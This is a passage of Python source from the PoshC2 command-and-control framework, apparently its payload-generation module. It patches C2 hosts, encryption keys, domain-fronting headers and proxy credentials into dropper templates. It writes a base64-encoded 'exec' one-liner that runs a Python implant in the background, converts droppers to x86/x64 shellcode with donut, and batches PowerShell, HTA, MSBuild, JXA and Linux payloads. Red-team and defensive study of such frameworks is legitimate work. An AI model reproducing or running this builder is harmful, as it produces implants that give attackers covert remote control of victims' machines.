            .replace("#REPLACEPROXYURL#", self.proxy_url) \
            .replace("#REPLACEPROXYUSER#", self.proxy_user) \
            .replace("#REPLACEPROXYPASSWORD#", self.proxy_password) \
            .replace("#REPLACEURLID#", str(self.url_id)) \
            .replace("#REPLACEUSERAGENT#", self.user_agent) \
            .replace("#REPLACESTAGERRETRIESLIMIT#", str(self.stage_retries_limit).lower()) \
            .replace("#REPLACESTAGERRETRIES#", str(self.stage_retries).lower()) \
            .replace("#REPLACESTAGERRETRIESWAIT#", str(self.stage_retries_initial_wait)) \
            .replace("#REPLACEIMPTYPE#", self.payload_comms_host)

        jxa = self.JXADropper.encode('UTF-8')
        jxadropper = jxa.decode('UTF-8')
        with open(f"{self.output_directory}{name}dropper_jxa.js", 'w') as f:
            f.write(jxadropper)

    def create_python(self, name=""):
        self.quickstart_log(Colours.END)
        self.quickstart_log(f"Python2 OSX/Unix/Win Dropper written to: {self.output_directory}py_dropper.sh")

        # get the python dropper template
        with open(f"{PayloadTemplatesDirectory}dropper.py", 'r') as f:
            dropper_file = f.read()

        # patch the key settings into the file
        self.py_dropper = str(dropper_file) \
            .replace("#REPLACEKILLDATE#", self.kill_date) \
            .replace("#REPLACEPYTHONHASH#", self.py_dropper_hash) \
            .replace("#REPLACESPYTHONKEY#", self.py_dropper_key) \
            .replace("#REPLACEKEY#", self.encryption_key) \
            .replace("#REPLACEHOSTPORT#", self.payload_comms_host) \
            .replace("#REPLACEQUICKCOMMAND#", "/" + self.hosted_files_url + "_py") \
            .replace("#REPLACECONNECTURL#", self.connect_url + "?m") \
            .replace("#REPLACEDOMAINFRONT#", self.domain_front_header) \
            .replace("#REPLACEURLID#", str(self.url_id)) \
            .replace("#REPLACEUSERAGENT#", self.user_agent)

        py = base64.b64encode(self.py_dropper.encode('UTF-8'))
        pydropper = f"echo \"import sys,base64;exec(base64.b64decode('{py.decode('UTF-8')}'));\" | python2 &"
        with open(f"{self.output_directory}{name}py_dropper.sh", 'w') as f:
            f.write(pydropper)

        pydropper = f"import sys,base64;exec(base64.b64decode('{py.decode('UTF-8')}'));"
        with open(f"{self.output_directory}{name}py_dropper.py", 'w') as f:
            f.write(pydropper)

    def create_dynamic_code_template(self, name=""):
        with open(f"{PayloadTemplatesDirectory}DynamicCode.cs", "r") as template:
            with open(f"{self.output_directory}DynamicCode.cs", "w") as payload:
                payload.write(template.read())

    def create_donut_shellcode(self, name="", pbind_only=False):
        self.quickstart_log(Colours.END)
        self.quickstart_log("Donut shellcode creation temporarily removed due to breaking changes in python 3.10")
        self.quickstart_log("Waiting on a fix to the donut module, in the meantime use the donut cli")
        #self.quickstart_log(Colours.END)
        #self.quickstart_log("Donut shellcode files:")
        #for Payload in PayloadType:
        #    if not pbind_only:
        #        self.create_donut_shellcode_file(Payload, name)
        #    if pbind_only and Payload in (PayloadType.PBind, PayloadType.PBindSharp):
        #        self.create_donut_shellcode_file(Payload, name)

    def create_donut_shellcode_file(self, payload_type, name=""):
        if payload_type == PayloadType.Posh_v2:
            sourcefile = "dropper_ps_v2.exe"
        elif payload_type == PayloadType.Posh_v4:
            sourcefile = "dropper_ps_v4.exe"
        elif payload_type == PayloadType.Sharp:
            sourcefile = "dropper_cs.exe"
        elif payload_type == PayloadType.PBindSharp:
            sourcefile = "pbind_cs.exe"
        elif payload_type == PayloadType.FCommSharp:
            sourcefile = "fcomm_cs.exe"
        else:
            return

        try:
            shellcode32 = donut.create(file=f"{self.output_directory}{name}{sourcefile}", arch=1)
            if shellcode32:
                output_file = open(f"{self.output_directory}{name}{payload_type.value}_Donut_x86_Shellcode.bin", 'wb')
                output_file.write(shellcode32)
                output_file.close()
                self.quickstart_log(
                    f"Payload written to: {self.output_directory}{name}{payload_type.value}_Donut_x86_Shellcode.b64")
                output_file = open(f"{self.output_directory}{name}{payload_type.value}_Donut_x86_Shellcode.b64", 'w')
                output_file.write(base64.b64encode(shellcode32).decode("utf-8"))
                output_file.close()
                self.quickstart_log(
                    f"Payload written to: {self.output_directory}{name}{payload_type.value}_Donut_x86_Shellcode.bin")
        except Exception as e:
            print_bad(
                f"Donut shellcode creation failed for {name}{payload_type.value}_Donut_x86_Shellcode.bin, skipping - {e}")

        try:
            shellcode64 = donut.create(file=f"{self.output_directory}{name}{sourcefile}", arch=2)
            if shellcode64:
                output_file = open(f"{self.output_directory}{name}{payload_type.value}_Donut_x64_Shellcode.bin", 'wb')
                output_file.write(shellcode64)
                output_file.close()
                self.quickstart_log(
                    f"Payload written to: {self.output_directory}{name}{payload_type.value}_Donut_x64_Shellcode.b64")

                output_file = open(f"{self.output_directory}{name}{payload_type.value}_Donut_x64_Shellcode.b64", 'w')
                output_file.write(base64.b64encode(shellcode64).decode("utf-8"))
                output_file.close()
                self.quickstart_log(
                    f"Payload written to: {self.output_directory}{name}{payload_type.value}_Donut_x64_Shellcode.bin")
        except Exception as e:
            print_bad(
                f"Donut shellcode creation failed for {name}{payload_type.value}_Donut_x64_Shellcode.bin, skipping - {e}")

    def create_all(self, name="", debug_payloads=False):
        self.quickstart_log(Colours.END)
        self.quickstart_log(Colours.END + "Payloads/droppers using powershell.exe:" + Colours.END)
        self.quickstart_log(Colours.END + "=======================================" + Colours.END)
        self.create_raw(name)
        self.createsct(name)
        self.createhta(name)

        self.quickstart_log(Colours.END)
        self.quickstart_log(Colours.END + "Payloads/droppers using shellcode:" + Colours.END)
        self.quickstart_log(Colours.END + "==================================" + Colours.END)
        self.create_droppers(name, debug_payloads=debug_payloads)
        self.create_unmanaged_windows(name)
        self.create_shellcode(name)
        self.create_dotnet2js(name)

        self.quickstart_log(Colours.END)
        self.quickstart_log(Colours.END + "PoshC2 Droppers using shellcode:" + Colours.END)
        self.quickstart_log(Colours.END + "========================================" + Colours.END)
        self.create_donut_shellcode(name)
        self.create_jxa(name)
        self.create_python(name)
        self.create_dynamic_code_template(name)
        self.create_dynamic_payloads(name)
        self.createmsbuild(name)
        self.createcsc(name)

    def create_pbind(self, name, debug_payloads=False):
        self.quickstart_log(Colours.END)
        self.quickstart_log(Colours.END + "Creating new PBind payloads:" + Colours.END)
        self.quickstart_log(Colours.END + "============================" + Colours.END)
        self.create_droppers(name, pbind_only=True, debug_payloads=debug_payloads)
        self.create_shellcode(name, pbind_only=True)
        self.create_dotnet2js(name, pbind_only=True)
        self.create_donut_shellcode(name, pbind_only=True)

    def create_linux(self, name):
        for payload_module_file in os.listdir(PayloadModulesDirectory):
            if not payload_module_file.endswith("Linux.py"):
                continue
            if __file__.endswith(f"/{payload_module_file}") or payload_module_file == "__init__.py":
                continue
            payload_module = os.path.splitext(payload_module_file)[0]
            module = importlib.import_module(f'poshc2.server.payloads.{payload_module}')
            shellcode_function = getattr(module, "create_payloads")
            shellcode_function(self, name)

    def create_dynamic_payloads(self, name):
        for payload_module_file in os.listdir(PayloadModulesDirectory):
            if not payload_module_file.endswith(".py"):
                continue
            if __file__.endswith(f"/{payload_module_file}") or payload_module_file == "__init__.py":
                continue
            payload_module = os.path.splitext(payload_module_file)[0]
            module = importlib.import_module(f'poshc2.server.payloads.{payload_module}')
            shellcode_function = getattr(module, "create_payloads")
            shellcode_function(self, name)
